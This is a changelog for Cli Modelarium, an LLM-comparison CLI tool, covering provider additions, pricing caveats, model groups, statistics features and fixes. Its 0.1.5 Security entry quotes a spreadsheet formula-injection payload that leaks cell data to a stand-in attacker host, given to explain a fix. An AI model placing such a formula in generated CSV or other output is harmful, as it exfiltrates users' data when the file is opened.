# Changelog

All notable changes to Cli Modelarium will be documented in this file.

## [0.1.6] - 2026-08-15

### Added

- **NVIDIA NIM as an eleventh cloud provider, with nine models.** `NVIDIAProvider` is a thin `OpenAIProvider` subclass pointed at `https://integrate.api.nvidia.com/v1`, registered in `PROVIDER_REGISTRY` with a `KEY_PATTERNS` entry, so `keys set nvidia` / `keys delete nvidia` work and the key is read from `NVIDIA_API_KEY`. The nine: `google/gemma-4-31b-it`, `google/diffusiongemma-26b-a4b-it`, `nvidia/nemotron-3-ultra-550b-a55b`, `nvidia/llama-3.3-nemotron-super-49b-v1`, `nvidia/nemotron-mini-4b-instruct`, `mistralai/mistral-nemotron`, `minimaxai/minimax-m3`, `poolside/laguna-xs-2.1` and `meta/llama-3.1-8b-instruct`. Each was screened against all 83 chat entries in NVIDIA's catalog and then called live. Models already reachable through another provider are deliberately absent, as are any whose answer arrives only in `reasoning_content`, all multimodal ones (this tool sends no images), and one that measured 10.3s to first token against 0.2-0.9 for the rest.

- **Cost is not tracked for these nine models, and three guards silently do not apply to them.** NVIDIA publishes no per-token rate for hosted NIM - not in the API, the featured-models feed or the catalog, and independently confirmed against LiteLLM, which carries 3,020 priced entries and exactly three NIM rows, all rerank, all zero. Their `PRICING` rows carry `0.0` because that is what the schema forces, **not** because they are free.

  **`--max-cost` and `cost_under` provide no protection on this provider.** `--max-cost` compares against an estimate that is identically zero, so the gate never trips - even `--max-cost 0` proceeds. A `cost_under` assertion passes on any of these models regardless of the limit, so a CI job goes green on an assertion that never meaningfully ran. `--significance-metric cost_usd` should not be trusted while one of these models is in the comparison: its cost is a constant placeholder rather than a measurement, and a comparison against a real-cost arm can report a confident, fabricated result.

  **Access is credit-metered rather than per-token, so you exhaust credits rather than receive a bill.** That is a different failure mode from every other provider in the table, and it is the thing "cost is not tracked" fails to convey on its own.

  A caveat panel titled **Cost not tracked** carries all three points and fires on `compare` and `batch` whenever one of these models is in a run. It renders alongside the temperature caveat rather than replacing it, and goes to stderr when a machine payload owns stdout.

  **Known limitation: the cost column shows `$0.000000` for these models, which is not a price.** A later release will render it accurately. Three surfaces the panel does not reach: a NIM model used **only** as `--judge` is not in the run's model list, so no panel fires and judge cost sums silently to zero; `list-models` and `pricing --all` render `$0.0000` for these rows with no panel anywhere near them, and `pricing` is the command whose entire job is stating cost; and the **file output paths** - `--output results.md`, `.json` or `.csv` contain the rows with no caveat at all, because the panel is console text and never enters the file.

  **What that warning does and does not reach.** The sentence above reaches the human who sets a pipeline up, once. It does not reach the pipeline. A scripted consumer reads JSON, and the JSON carries no pricing caveat key: `total_cost_usd` reports `0` with nothing distinguishing it from a genuinely free run, and there is no top-level key marking which models were unpriced - unlike the temperature caveat, which has `models_without_temperature` and `significance_temperature_mixed`. Until a later release adds one, an automated consumer has no signal on any surface.

- NVIDIA models are in **no group**. They are excluded from the dynamic `all` group alongside `local` and `openrouter`, and from every static group. `all` otherwise means every model whose cost can be stated; the registry already holds four duplicate-weight pairs each neutralised only because OpenRouter is excluded, so NVIDIA would be the first provider able to put a genuine duplicate there; and a run exits `2` if any cell errors, while roughly half NVIDIA's catalog was unreachable when screened and availability moves between runs.
- The `KEY_PATTERNS` entry closes a split-brain before it can open. `configure` iterates `all_known_providers()` with no membership gate and `validate_key()` returns True for a provider with no pattern, while `keys set` and `keys delete` both gate on `KEY_PATTERNS` membership - so a provider present in `PRICING` and absent from `KEY_PATTERNS` would let `configure` write a credential that `keys delete` then refuses to remove. A test pins the invariant as a subset (every provider in `PRICING` except `local` must have a pattern) rather than an equality, so a provider can be wired before its models are registered.
- `tests/test_nvidia_provider.py`, following the per-provider file precedent set by `tests/test_zai_provider.py` rather than extending `tests/test_provider_inheritance.py`, whose three hand-maintained literal lists already omit `ZAIProvider` entirely.

### Changed

- **The nine READMEs document NVIDIA NIM.** The provider count is now eleven, the supported-providers table carries an NVIDIA NIM row reading **No published rate** under cost tracking, and the *Pricing data* section records that cost is not tracked and that `--max-cost` and `cost_under` give no protection there. Translated in place in all eight non-English files.

- **The project moved to SoraVantia GK.** The repository is now at [github.com/SoraVantia/cli-modelarium](https://github.com/SoraVantia/cli-modelarium), and the copyright holder in `LICENSE` and `NOTICE` is SoraVantia GK. Cli Modelarium was created by Lavelle Hatcher Jr, who continues to maintain it - `pyproject.toml` now records SoraVantia GK as `authors` and Lavelle Hatcher Jr as `maintainers`, and PyPI renders both.

  **Nothing about installing or using the tool changes.** The package is still `cli-modelarium` on PyPI, the command is still `cli-modelarium`, and the import path is still `cli_modelarium`. No code path, flag, output format or default changed.

  This is not a licence change. Cli Modelarium remains under Apache License 2.0; only the copyright holder moved. Third-party attributions in `NOTICE` are untouched.

  Repository links were updated across all nine READMEs, `CONTRIBUTING.md`, `SECURITY.md`, `pyproject.toml` and `.github/FUNDING.yml`. One is not documentation: the `HTTP-Referer` header the OpenRouter provider sends identifies the project by repository URL, and now carries the new one.

### Fixed

- **The privacy note now covers all three output formats.** It warned that JSON embeds the full prompt and the full model response and named `results.json` alone, which implied CSV and Markdown were safe to publish. All three carry the same content - CSV has `prompt`, `system`, `output` and `error` columns, and the Markdown report embeds both in full - and CSV is the likeliest of the three to be uploaded as a CI artifact. Corrected in all nine READMEs.

- **Repository URLs now use the lowercase repository name.** The repository is at [github.com/SoraVantia/cli-modelarium](https://github.com/SoraVantia/cli-modelarium), matching the PyPI package, the command and the import path; links written `Cli-Modelarium` were updated across the nine READMEs, `CONTRIBUTING.md`, `SECURITY.md`, `pyproject.toml`, this file and the OpenRouter `HTTP-Referer` header. The project name is unchanged - only the URL. `github.com` resolves case-insensitively, but `raw.githubusercontent.com` does not, and the two absolute asset URLs README.md carries are the ones PyPI renders.

- **The `all` group excludes NVIDIA, and all nine READMEs now say so.** They described `all` as excluding local models and OpenRouter; `_resolve_all_cloud` excludes local, OpenRouter and NVIDIA. A user who configured `NVIDIA_API_KEY` and ran `--models all` got no NIM models and no explanation. The sentence now names all three and gives the reason in a clause.

- **The eight translations documented manual re-running instead of `--runs`.** They carried the pre-`--runs` advice to run the same comparison three to five times and look for patterns - wrong advice rather than missing advice, since the flag has done it automatically for several releases. Both bullets README.md documents it in are now translated, along with the coefficient-of-variation threshold, the `stats_by_cell` JSON key and the `--runs` plus `--check-hallucination` combination. `System requirements` is also translated rather than left English-only, so the note naming seven English-only sections is now accurate. `tests/test_readme_parity.py` pins all of it: the provider count, the temperature model list, every static group row, the date set and the heading structure are asserted against the registry across all nine files, so a fact can no longer drift in documentation while the code moves.

- **The READMEs now list every provider's environment variable and name the correct set of models that omit temperature.** The headless-Linux export block carried nine variables for eleven cloud providers - `ZAI_API_KEY` had been missing since Z.AI landed in 0.1.4 - and the comparison-methodology section listed nine models as omitting the temperature field when the registry has twelve, the three `gpt-5.6` variants added in 0.1.5 having gone unrecorded.

### Security

- `redact_secrets()` now removes `nvapi-` prefixed tokens. The `Authorization: Bearer`, `x-api-key:` and `api_key=` rules already caught it, because those match on the surrounding marker rather than on the key's shape, but a bare token quoted in a JSON error body carries no marker and nothing matched it. Redacted provider errors reach the `error` column of both CSV and JSON output, which CI pipelines commonly upload as an artifact, so the gap ended at a file people publish.

  **Scope, stated precisely: this was not reachable at 0.1.5.** Nothing read `NVIDIA_API_KEY` - every `load_key()` and `is_key_configured()` call site is driven by `all_known_providers()`, which derives from `PRICING`, and no NVIDIA model was registered - so no `nvapi-` token could enter an error string through the tool. The gap was in the redaction table, not in a live path. It is fixed in the same release that makes it reachable, not after. The seven pre-existing prefix rules are unaffected and are now pinned to their exact output by a regression test, so a future pattern addition cannot silently swallow one into the wrong placeholder.

### Dependencies

- Widened `mistralai` from `>=2.4.7,<2.9.0` to `>=2.4.7,<2.10.0`. The 2.8 line is terminal - 2.8.0 was its only release - and this SDK ships forward-only generated releases without backports, so an upstream security patch would land at 2.9 or above and the old ceiling would have kept it from reaching users. 2.9.3 was run against the full suite. The floor stays at `2.4.7`: it excludes the withdrawn 2.4.6 release (GHSA-wx9m-wx4f-4cmg).
- Declared `numpy>=1.17` explicitly. It was already installed as a transitive dependency of `scipy`, but `run_statistics.py` imports it directly, so the import now rests on a declaration rather than on another package's requirements. The floor is what the code uses: `numpy.random.default_rng` and `Generator.integers` arrived in 1.17.0. No ceiling - no numpy release has broken this project.

## [0.1.5] - 2026-08-07

### Breaking

- **Removed the `all-fast` model group.** `--models all-fast` is no longer a group name; it now gives the same `Unknown model: all-fast` error as any unrecognised token. The seven models it contained are untouched - all remain in `PRICING` and can still be named individually - and no other group changed membership.

  The reason is that the selection could not be defended. The seven were a curated one-model-per-provider pick, and this project has never measured latency, so the members were not chosen on any figure it can cite. Ranking each member against the other models from its own provider (blended input + output rate) shows the membership does not track price either: `claude-haiku-4-5` 1/10 and `deepseek-v4-flash` 1/2 are their provider's cheapest, but `glm-5-turbo` is 10th of 14, `gemini-3.5-flash` 5th of 6, and `llama-3.3-70b-versatile` is the **dearest** of Groq's four. Nor was the group simply "every model named fast": eight registered provider ids contain `flash`, `turbo`, `fast` or `instant` and were not in it, among them `gemini-2.5-flash`, `gemini-3.6-flash`, `glm-4.7-flash`, `glm-4.5-flash` and `qwen-flash`. Naming broke ties; it was not the rule. A group asserting a property the project cannot support is worse than no group, so it is withdrawn rather than redefined.

  Removed outright rather than deprecated behind a warning. `RETIRED_MODELS` exists to prevent silent *substitution* - a retired id resolving to something else and billing at a different rate while the run appears to succeed - and there is no substitution risk here: the token stops resolving before any request is built. Nothing was added to `RETIRED_MODELS`; a group was withdrawn, not a model retired.

  **What replaces it.** There is no drop-in group. The closest surviving group is `all-budget`, but it is not equivalent: it covers six of the seven providers, **drops Groq**, and **requires `OPENAI_API_KEY` and `MISTRAL_API_KEY` that `all-fast` did not** - so a user with exactly the keys `all-fast` needed gets `No API key configured for openai`. If you want what `all-fast` ran, name the models directly: `--models claude-haiku-4-5,gemini-3.5-flash,grok-4.20-0309-non-reasoning,deepseek-v4-flash,llama-3.3-70b-versatile,qwen3.6-flash,glm-5-turbo`.

  **What you will see.** If your run previously failed for a missing key, the exit code is unchanged at `2` and only the message differs - the group aborted on the first missing credential before, and the token is unrecognised now. If your run previously **worked**, it now exits `2` where it exited `0`, so a script gating on a non-zero status fails immediately rather than silently. Note that a shell redirect such as `--output-format json > results.json` still creates the file, so a pipeline that uploads that artifact will publish an empty one.

### Added

- `RetiredModelError` and a `RETIRED_MODELS` map for model IDs a provider has retired. Resolution now fails with a message naming the suggested replacement and the retirement date, and never substitutes the replacement: silent substitution is the failure mode this prevents (xAI, for example, redirects retired slugs to `grok-4.3` and bills at `grok-4.3` rates, so a request appears to succeed while the reported cost is wrong by ~6x). The check sits in `get_provider_for_model()`, the single chokepoint every comparison, batch run and judge validation routes through before any request is built, and is repeated in the `pricing <model>` command, which reads `PRICING` directly.
- `gpt-5.6-sol` (5.00 / 30.00 / 0.50), `gpt-5.6-terra` (2.00 / 12.00 / 0.20) and `gpt-5.6-luna` (0.20 / 1.20 / 0.02), OpenAI's current line. All three carry `rejects_sampling_params` - each returns `400 Unsupported value: 'temperature' does not support 0 with this model. Only the default (1) value is supported.`, so without the flag every call would fail, exactly as the nine models in Fixed below did. `gpt-5.6-terra` is OpenAI's named replacement for `o4-mini`, which shuts down 2026-10-23 with its bare alias attached; `o4-mini` still works until then and is unchanged, as is its group membership. Prices are the standard short-context column - all three have a long-context tier above 272K, and `gpt-5.6-sol` doubles to 10.00 / 45.00 there. Verified 2026-08-07 by live call, one day after `PRICING_AS_OF`; the constant is deliberately not moved, since the rest of the registry was not re-verified on that date.
- `gemini-3.6-flash` (1.50 / 7.50 / 0.15), Google's recommended replacement for the removed `gemini-3-flash`.
- `claude-opus-5` (5.00 / 25.00 / 0.50) and `claude-sonnet-5` (3.00 / 15.00 / 0.30). Sonnet 5 stores Anthropic's list price; introductory pricing of 2.00 / 10.00 runs through 2026-08-31, with list pricing effective 2026-09-01.
- Cache-read rate for `gpt-5.3-codex` (0.175), which was missing.
- A group-membership invariant test: every member of every static group must be a live `PRICING` entry and must not be provider-retired. No test pinned group membership before now, which is why the dead `deepseek-reasoner` entry in `all-reasoning` survived a green suite.
- `tests/test_deepseek_provider.py`, covering provider identity, routing, cost, and that `_extra_create_kwargs()` stays an empty dict so no thinking-toggle reaches the wire.
- Dated deprecation comments next to `o4-mini`, `o3`, `o3-pro`, `gemini-2.5-flash`, `gemini-2.5-flash-lite` and `claude-haiku-4-5`, so the deadlines live in the code. No pricing or behavior change.
- A per-model `rejects_sampling_params` flag in `PRICING`, read through a new `rejects_sampling_params(model)` helper. Nine entries carry it - `gpt-5`, `gpt-5.5`, `o3`, `o4-mini`, `claude-opus-4-7`, `claude-opus-4-8`, `claude-opus-5`, `claude-sonnet-5` and `claude-fable-5` - and for those the Anthropic and OpenAI-compatible request builders omit `temperature` entirely. The direction of the default is deliberate: **absent means send.** Every other registry entry, every `local/` id, every OpenRouter passthrough id and every model added in future keeps receiving `temperature`. A newly-restricted model added without the flag therefore fails loudly with a 400 that names the parameter; under the opposite default it would quietly lose `temperature` with no error and nothing in the suite to catch it.
- `JudgeResult.degraded_models`, recording judges that ran at the provider default because they reject a temperature setting. Judging asks for `0.0` as before, but a flagged judge cannot honour it, so its scores are not reproducible run to run. The caveat is surfaced on all three output surfaces: a console note under the comparison table, a `(degraded: ...)` suffix on the Markdown Score cell, and a `judge_degraded` list per result in JSON.
- A `Temperature not applied` warning when a multi-value `--temperatures` sweep includes a model that omits the field, on both `compare` and `batch`. Every run of that model is an identical request rather than a sweep. It fires after group expansion, so it also covers the case where the user never typed the affected id - `--models all-premium --temperatures 0,0.5,1` names it explicitly.
- A mixed-sampling caveat on `compare`, for a significance run that compares a model which omits `temperature` against one that honours it. The two groups are sampled under different conditions, so the p-value can be reporting that rather than model quality. It fires whenever a verdict will actually be computed - including on the default invocation, `--models a,b --runs 10`, where `--significance` was never typed and auto-enables. That was the gap: the existing sweep warning covers only multi-value `--temperatures`, so the single-temperature case produced a statistical verdict with no signal anywhere. Where both caveats apply, they are **merged into one panel** carrying both messages rather than either suppressing the other; the sweep warning is unchanged everywhere it fires today. `batch` is unaffected - it has no `--runs` and no `--significance`, so it never computes a verdict to caveat.
- A top-level `significance_temperature_mixed` boolean in JSON output, the machine-readable half of that caveat: a script reading `--output-format json` otherwise gets a p-value with no indication the samples were incomparable. Like `models_without_temperature` it is always present, top level (**not** in the `methodology` block, which is gated on `--runs > 1`), and it is `false` from `batch`, which cannot mix a verdict. `CSV_COLUMNS` is unchanged.
- A top-level `models_without_temperature` key in JSON output, listing the models in that run whose `temperature` was omitted. Top level, **not** inside the `methodology` block, which is emitted only when `--runs > 1`. The key is always present and is an empty list when no such model ran. **CSV output carries no equivalent signal:** its `temperature` column records the value requested, not the value applied, and `CSV_COLUMNS` is unchanged this release.

### Changed

- Corrected `mistral-small-latest` to 0.15 / 0.60. The alias now resolves to Mistral Small 4; the previous 0.10 / 0.30 understated cost in both `all-budget` and `all-cheap`.
- `all-reasoning` now uses `deepseek-v4-pro` in place of the retired `deepseek-reasoner`. DeepSeek exposes reasoning as a mode rather than a separate model; Pro is the stronger of the two V4 models and Flash already fills the DeepSeek slot in `all-budget`, `all-fast` and `all-cheap`. Synced the group table across the README and all 8 translations.
- Re-verified provider pricing against first-party pages (2026-07-29) and bumped `PRICING_AS_OF` to 2026-07-29. One exception: the Z.AI/GLM block was not part of that pass and keeps its own earlier `2026-06-22` verification date in `pricing.py`; its 14 entries are unchanged since then.
- `all-open-weight` now uses the Groq-served `openai/gpt-oss-120b` and `openai/gpt-oss-safeguard-20b` in place of the removed `gpt-oss-120b` and `gpt-oss-20b`. The group keeps four members and every one of them is callable. **This changes which credential the group needs:** the removed entries were openai-provider, the replacements are groq-provider, so `--models all-open-weight` now requires `GROQ_API_KEY` for two slots that previously used `OPENAI_API_KEY`. Synced the group table across the README and all 8 translations.
- The module docstring and the eight per-provider section comments in `pricing.py` still read "Verified 2026-06-22" after `PRICING_AS_OF` was bumped. The docstring and those eight now read 2026-07-29; the ninth section comment, Z.AI's, keeps its own earlier date by design - see the note beside it in `pricing.py`.

### Removed

- `deepseek-chat` and `deepseek-reasoner`, retired by DeepSeek on 2026-07-24. Both are in `RETIRED_MODELS`.
- `grok-4.1-fast`, retired by xAI on 2026-05-15 and absent from its current pricing page. In `RETIRED_MODELS`.
- `mistral-medium-3.5`, a duplicate of `mistral-medium-latest` at the same price and not an ID Mistral documents. Deliberately not in `RETIRED_MODELS` - it was never provider-retired, so "Unknown model" is the accurate error.
- `gemini-3-flash`, whose ID and price were both wrong (the real ID is `gemini-3-flash-preview`; the stored 0.30 / 2.50 was `gemini-2.5-flash`'s rate). Also not in `RETIRED_MODELS`, for the same reason.
- `get_pricing()` from `pricing.py`, along with a dead branch in the judge Score-column renderer. It had no callers in `src/` and, unlike every live resolution path, did not check `RETIRED_MODELS` - a retired ID returned `None` rather than raising. It was never exported in `__init__.py`, but `from cli_modelarium.pricing import get_pricing` no longer resolves.
- `gpt-5.5-pro`, `gpt-5.4-pro`, `gpt-5.3-codex`, `gpt-5.3-codex-spark`, `gpt-oss-120b` and `gpt-oss-20b`, none of which are callable on the chat-completions endpoint this tool uses. Some are Responses-API-only; the rest were registered under ids this tool cannot call on that endpoint. Deliberately **not** in `RETIRED_MODELS`, for the same reason as `mistral-medium-3.5` and `gemini-3-flash` above: none was retired by its provider, so "Unknown model" is the accurate error and a retirement message naming a replacement would be false. Note that `gpt-5.3-codex` gained a cache-read rate earlier in this same release; correcting a price and then removing the entry in one release is deliberate - the rate was wrong and the model was never reachable - not thrash.

### Fixed

- Nine models could not be called at all. Any request carrying a non-default `temperature` came back 400, and `compare`/`batch` always send one, so `claude-opus-5`, `claude-sonnet-5`, `claude-opus-4-8`, `claude-opus-4-7`, `claude-fable-5`, `gpt-5`, `gpt-5.5`, `o3` and `o4-mini` failed every time - including as judges, and including through the `all`, `all-premium` and `all-flagship` groups. Omitting the field is the documented way to call them, and that is what now happens.
- **Exit codes on existing CI pipelines will move as a result.** A batch suite whose assertions could not run because the model returned 400 exits `2` today; from this release those assertions actually execute and the suite exits `0` or `1` on their real outcome. A previously-red pipeline may go green, or may fail on assertions for the first time. That is the intended fix, but a green-to-red flip reads like a regression to anyone who has not read this note.
- Worth knowing where the caveat bites hardest: `--significance` is the one place it can change a *conclusion* rather than a label. Comparing a model that omits `temperature` against one that honours it produces a variance difference that is a sampling artifact, and Welch or Mann-Whitney will report it as though it were a model-quality difference. That case now has a signal on both surfaces - see the mixed-sampling caveat below - where previously it had none, because the sweep warning fires only on multi-temperature runs and the dangerous invocation is the single-temperature default.
- **Human output no longer shares stdout with a machine payload.** `--output-format json|csv` writes to stdout, but so did the progress bar, the `Running batch:` line, the run summary, the judge ToS panel and six other sites - none of them gated on the output format. JSON raised on the extra bytes; CSV was worse, because `csv.reader` silently read a contaminating line as the header (one column instead of 21) or as an extra data row, and raised nothing. `compare` was affected too, not only `batch`: `--judge` prints the ToS panel unless `--no-judge-tos` is passed, so the default judging path corrupted the payload at any terminal width. Fixed as a scope rule rather than a list of sites - when there is no `--output` file and the format is `json` or `csv`, the command binds a stderr console for its whole body, so every site inherits it, including any added later. Two earlier attempts at this enumerated the sites and missed some both times. **The progress output is moved, not suppressed:** it is still there on stderr for anyone watching a long batch run.
- **Rich no longer reflows the serialized payload.** The JSON and CSV stdout branches went through `console.print()`, which wraps at the terminal width - so any response longer than the terminal corrupted the payload, and `jq` failed with `Invalid string: control characters from U+0000 through U+001F must be escaped`. This passed on a wide developer terminal and failed at the 80 columns CI defaults to. The payload is now written straight to `sys.stdout.buffer` as UTF-8, bypassing Rich entirely: wrapping is only one of three ways it mutates a payload, alongside consuming square-bracket markup and colouring numbers and URLs. Writing bytes rather than text also keeps the stdout stream byte-identical to the `--output` file on Windows, where text mode would translate the line endings.

These two were independent: fixing either one left the other. `--output FILE` was never affected and is unchanged.

**Behaviour change for existing scripts.** Anyone working around the old output - stripping the first two lines before parsing, say - will now strip two lines of valid payload. The workaround should be removed rather than kept.

### Security

- **CSV formula injection.** A cell whose value began with `=`, `+`, `-`, `@`, tab, carriage return or line feed was written verbatim, and spreadsheet applications evaluate such a cell as a formula rather than reading it as text. A model response of `=HYPERLINK("http://evil.example/?d="&A2,"Click")` therefore became a live exfiltration link the moment `results.csv` was opened in Excel, Google Sheets or LibreOffice. Reachable two ways: through model output, which is the least controlled content in the system, and through the batch file's `id` field, which becomes the `prompt_id` column and needs no model cooperation at all. All six text columns were affected - `prompt_id`, `prompt`, `system`, `model`, `output`, `error` - and `prompt_id` and `model` had never passed through any escaping helper. Values beginning with one of the seven characters are now prefixed with an apostrophe, which spreadsheets treat as a text marker. The escaping sits at the field-write boundary inside `_format_csv`, so it covers every column including any added later, and JSON and Markdown are deliberately untouched: JSON has no formula-injection problem and Markdown needs a different mitigation. Full-width variants (`＝` `＋` `－` `＠`), which OWASP notes are interpretable as formulas in some locales, are **not** covered.
- The transform is not perfectly invertible. A value that legitimately begins with an apostrophe is indistinguishable from an escaped one, so a consumer that strips a leading apostrophe unconditionally will corrupt it.
- **`prompt_id` now differs between CSV and JSON.** Because the escaping lives inside the CSV formatter and JSON is deliberately left alone, a `prompt_id` beginning with one of the seven characters reads as `-baseline` in JSON and `'-baseline` in CSV. `prompt_id` is the natural join key - it is user-chosen through the batch file's `id`, uniqueness is enforced, and the README's own examples use semantic ids like `math-1` - so a consumer correlating the two formats, or joining a CSV back to its source batch file, would silently fail to match. It only bites when an id begins with one of the seven characters, and `-baseline` is not exotic.

### Dependencies

- Widened `mistralai` from `~=2.4.7` to `>=2.4.7,<2.9.0`, so the 2.5 through 2.8 minor series are allowed and an upstream security patch can be received without an emergency release. The floor stays at `2.4.7` deliberately: it excludes the compromised 2.4.6 release (GHSA-wx9m-wx4f-4cmg), and 2.4.7 is also the first mistralai release carrying signed publish attestations. All fifteen versions in the new range were run against the full suite.
- Tightened the `ruff` dev constraint from `~=0.15` to `~=0.16.0`. This is a ceiling tightening as much as an upgrade: two-component `~=0.15` allowed anything below `1.0`, while three-component `~=0.16.0` means `<0.17`.

## [0.1.4] - 2026-06-22

### Added

- DashScope (Alibaba Model Studio, International/Singapore endpoint) provider with 6 Qwen models (qwen3.7-max, qwen3.7-plus, qwen3.6-flash, qwen3.6-plus, qwen-flash, qwen3-coder-plus). Uses `DASHSCOPE_API_KEY`. Sends `enable_thinking=false` so costs reflect non-thinking rates. Added an `_extra_create_kwargs()` hook to the OpenAI-compatible base (default no-op) to support this.
- `--models all` now resolves to every cloud model with a configured API key (excludes local and OpenRouter); `--models all-local` resolves to the models reported by a running local server, with a clear message when none is reachable. Previously these tokens errored with "Unknown model."
- Documented the model-group shortcuts (static groups + `all`/`all-local`) in the README.
- Added Python 3.14 to the tested CI matrix (the 3.14 classifier was already declared; CI now exercises it). Minimum supported version remains 3.11.
- Z.AI/GLM provider (Zhipu AI, OpenAI-compatible overseas endpoint) with 14 GLM text models (glm-5.2, glm-5.1, glm-5, glm-5-turbo, glm-4.7, glm-4.7-flash, glm-4.7-flashx, glm-4.6, glm-4.5, glm-4.5-air, glm-4.5-x, glm-4.5-airx, glm-4.5-flash, glm-4-32b-0414-128k), including the free glm-4.7-flash / glm-4.5-flash. Uses `ZAI_API_KEY`; reuses the existing OpenAI-compatible stack (no new dependency).
- Current Claude models: claude-fable-5 (new frontier tier), claude-opus-4-8 (recommended Opus flagship), claude-opus-4-5, claude-sonnet-4-5. The `all-premium` / `all-flagship` groups now point at claude-opus-4-8.
- Added Z.AI/GLM and Alibaba/Qwen models to the static model groups: `all-premium`/`all-flagship` (qwen3.7-max, glm-5.2), `all-budget` (qwen3.7-plus, glm-4.5-air), `all-fast` (qwen3.6-flash, glm-5-turbo), `all-cheap` (qwen-flash, glm-4.7-flashx), and glm-5.2 in `all-reasoning`. Qwen is intentionally excluded from `all-reasoning`: the DashScope provider sends `enable_thinking=false`, so a Qwen model there would run non-thinking; glm-5.2 reasons by default through the Z.AI provider.

### Changed

- Corrected pricing to first-party provider rates (OpenAI o3/o3-pro/gpt-5.4-pro + cached rates; Google Gemini flash/flash-lite; Mistral medium/small; Groq gpt-oss/llama-4-scout; DeepSeek v4-pro/v4-flash/chat/reasoner).
- Corrected `gemini-3.1-pro` pricing to first-party rates (2.00/12.00/0.20) and renamed it to `gemini-3.1-pro-preview` to match the live API model id (the Gemini provider sends the id verbatim).
- Corrected `grok-4.20` and `grok-4.20-multi-agent` pricing to first-party rates (1.25/2.50) and updated their model ids to the live dated strings (`grok-4.20-0309-non-reasoning`, `grok-4.20-multi-agent-0309`).
- Repaired static model groups: replaced retired `grok-4.1-fast` (all-budget/all-fast) with `grok-4.20-0309-non-reasoning` and removed it from all-cheap; replaced `gemini-3-flash` with `gemini-3.5-flash` in all-fast. (`deepseek-reasoner` in all-reasoning is intentionally retained this release; its swap to a confirmed thinking-capable v4 id is deferred pending a live check before its 2026-07-24 deprecation.)
- Added OpenAI cache-read rates (`gpt-5`, `gpt-4.1-mini`, `gpt-4o`, `gpt-4o-mini`).
- Synced the README and all 8 translations to the current model groups, provider list, and pricing date; tightened the local-server ("running on localhost") and per-call model-selection feature descriptions for accuracy.
- Re-verified all provider pricing against first-party pages (2026-06-22). Bumped `PRICING_AS_OF` to 2026-06-22.

### Fixed

- The Google provider now also accepts `GEMINI_API_KEY` (the documented alias was previously ignored; only `GOOGLE_API_KEY` was read). `GOOGLE_API_KEY` still takes precedence.

### Dependencies

- No dependency changes.

## [0.1.3] - 2026-05-28

### Added

- Bootstrap confidence intervals on per-cell means via `scipy.stats.bootstrap`. Auto-enabled when `--runs > 1`.
- New CLI flags on `compare`:
  - `--confidence-intervals` / `--no-confidence-intervals` (auto-enabled with `--runs > 1`)
  - `--ci-level FLOAT` (default `0.95`)
  - `--ci-method {bca,percentile,basic}` (default `bca` - publication-grade)
  - `--bootstrap-resamples INT` (default `5000`, min `100`)
  - `--bootstrap-seed INT` (required for reproducible CIs)
- New test choices on `--significance-test`:
  - `paired-t` - paired t-test via `scipy.stats.ttest_rel` (more statistical power for same-prompt comparisons)
  - `wilcoxon-signed` - Wilcoxon signed-rank via `scipy.stats.wilcoxon` (non-parametric paired)
- McNemar's test for paired binary outcomes. Auto-triggers when `--check-hallucination` is set with `--runs > 1` and 2+ models. Uses exact binomial test (`scipy.stats.binomtest`) for small discordant counts or Edwards continuity-corrected chi-square (`scipy.stats.chi2.sf`) for larger samples - NOT `scipy.stats.chi2_contingency` on the full 2×2 table (which would compute a test of independence, not McNemar).
- Bootstrap CIs on Cohen's d effect sizes via paired/independent bootstrap.
- `mcnemar_tests` array in JSON output when applicable.
- `methodology` block in JSON output recording bootstrap parameters, scipy version, and seed for reproducibility.
- Additive CI columns in CSV output (`latency_ms_ci_low`, `latency_ms_ci_high`, etc.) when CIs are enabled.
- Additive Markdown sections: "Bootstrap confidence intervals", "Statistical significance tests", "Binary outcome significance (McNemar)", "Statistical methodology".
- New public functions in `cli_modelarium.run_statistics`:
  - `ConfidenceInterval`, `McNemarResult` dataclasses
  - `bootstrap_ci()` - thin scipy wrapper with degenerate-data handling
  - `paired_t_test()`, `wilcoxon_signed_rank()`
  - `mcnemar_test()` - Edwards-corrected or exact binomial McNemar
  - `compute_significance_with_ci()` - like `compute_pairwise_significance` plus CIs on Cohen's d
  - `compute_stats_with_cis()` - CIs on per-model metric means
  - `compute_mcnemar_pairwise()` - pairwise McNemar over hallucination pass/fail
- New private helpers ensuring paired tests align by `run_index` even when failures are asymmetric:
  - `_extract_paired_metric_samples()`
  - `_align_paired_samples()`

### Changed

- `SignificanceResult` dataclass extended with seven optional fields (all default `None`): `bootstrap_ci_low`, `bootstrap_ci_high`, `bootstrap_method`, `bootstrap_resamples`, `bootstrap_seed`, `effect_size_ci_low`, `effect_size_ci_high`. v0.1.2-style positional instantiation continues to work unchanged.
- Output formatters extended so CSV, Markdown, and JSON all receive significance, CI, McNemar, and methodology data (previously only JSON received significance results - a v0.1.2 wiring gap).
- `_emit_batch_results` threads the new parameters into every formatter branch.

### Dependencies

- No new runtime dependencies (uses scipy 1.17 already in v0.1.2).
- `NOTICE` unchanged - scipy is already attributed.
- Python version unchanged (still `>=3.11` from v0.1.2).

## [0.1.2] - 2026-05-28

### ⚠️ Breaking Changes

- **Minimum Python version is now 3.11** (was 3.10).
  - Reason: scipy 1.17+ is a new runtime dependency for statistical significance testing, and scipy 1.17 requires Python 3.11+.
  - Python 3.10 users can continue using cli-modelarium v0.1.1, which remains available on PyPI.
  - Python 3.10 reaches end-of-life in October 2026.

### Added

- Pairwise statistical significance testing on the `compare` command. Auto-enabled when `--runs > 1` with 2+ models.
- New CLI flags on `compare`:
  - `--significance` / `--no-significance` (auto-enabled with `--runs > 1` and 2+ models)
  - `--significance-threshold FLOAT` (default: `0.05`)
  - `--significance-test {welch,mann-whitney}` (default: `welch`)
  - `--correction {none,bonferroni,holm}` (default: `bonferroni`)
  - `--significance-metric {score,latency_ms,output_tokens,cost_usd}` (default: `score` when judging, else `latency_ms`)
- Welch's t-test via `scipy.stats.ttest_ind(equal_var=False)`.
- Mann-Whitney U test via `scipy.stats.mannwhitneyu` with continuity correction.
- Cohen's d effect size with conventional interpretation bands (`negligible` / `small` / `medium` / `large`), implemented in pure stdlib.
- Bonferroni and Holm-Bonferroni multiple-comparison corrections, implemented in pure stdlib with monotone enforcement.
- JSON output now includes a `significance_tests` array when significance testing was performed. When significance is disabled or trivially absent, the JSON schema is unchanged (additive only).
- Display strategy: single-line summary for 2 models, matrix table for 3-5 models, top-K significant pairs for 6+ models (full matrix available in JSON).
- New functions in `cli_modelarium.run_statistics`:
  - `SignificanceResult` dataclass
  - `compute_pairwise_significance()`
